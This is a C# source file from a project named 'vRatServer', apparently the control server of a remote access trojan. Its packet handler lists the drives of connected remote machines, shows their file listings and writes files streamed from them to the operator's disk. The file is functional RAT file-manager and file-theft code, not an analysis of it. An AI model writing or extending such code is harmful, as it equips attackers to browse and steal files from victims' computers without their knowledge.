using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;
using vRatServer.Forms;

namespace vRatServer.Packets
{
    class FileManagerPacket
    {
        byte[] _data;
        ulong id;
        byte[] idp;
        Client client;
        byte com;

        ~FileManagerPacket()
        {
            
        }
        public FileManagerPacket(Client client, byte[] data, byte com, byte[] idp)
        {
            _data = data;
            this.idp = idp;
            this.client = client;
            this.com = com;
            parsefmp();


        }

        private void Drive()
        {
            Program.f1.Invoke((MethodInvoker)delegate {
                if (client.fmf == null) { return;}
                client.fmf.DriveCombo.Items.Add(System.Text.Encoding.Unicode.GetString(_data));

            });

        }

        private void FileDownload()
        {
            ulong iid = BitConverter.ToUInt64(idp, 0);


            bool found = false;
            client.fmf.DownloadFileMutex.WaitOne();

            foreach (DownloadFile f in client.fmf.downloadFileForms)
            {
                
                if (f.myfileid == iid)
                {
                    found = true;
                    if (f.IsDisposed)
                    {
                        if (f.stream.CanWrite)
                        {
                            f.stream.Close();
                        }
                        break;
                    }

                    if (_data.Length == 0) { f.stream.Close(); client.fmf.downloadFileForms.Remove(f); f.downloaded = true; break; }
                    f.stream.Write(_data, 0, _data.Length);
                    Program.f1.Invoke((MethodInvoker)delegate {
                        if (f == null) { return; }
                        f.ChangeFileSize(_data.Length);

                    });

                }

            }


            if (found == false) { MessageBox.Show("File not found : " + iid.ToString()); }
            client.fmf.DownloadFileMutex.ReleaseMutex();






        }

        private void parsefmp()
        {
            if (com == (byte)globals.PacketType.FileManagerDrive) { Drive(); return; }
            if (com == (byte)globals.PacketType.FileManagerFileDownload) { FileDownload(); return; }

            string text = System.Text.Encoding.Unicode.GetString(_data);
            StringReader reader = new StringReader(text);
            ListViewItem nfile = new ListViewItem();
            int i = 0;
            while (true)
            {
                string line = reader.ReadLine();

                if (line == null)
                {
                    break;
                }
                line = line.TrimEnd('\r', '\n');
                if (i == 0)
                {
                    nfile.Text = line;
                }
                else { nfile.SubItems.Add(line); }

                i++;

            }

            Program.f1.Invoke((MethodInvoker)delegate {
                if (client.fmf != null)
                {
                    try
                    {
                        client.fmf.FilesList.Items.Add(nfile);
                    }
                    catch (Exception) { }
                }

            });


        }
    }
}
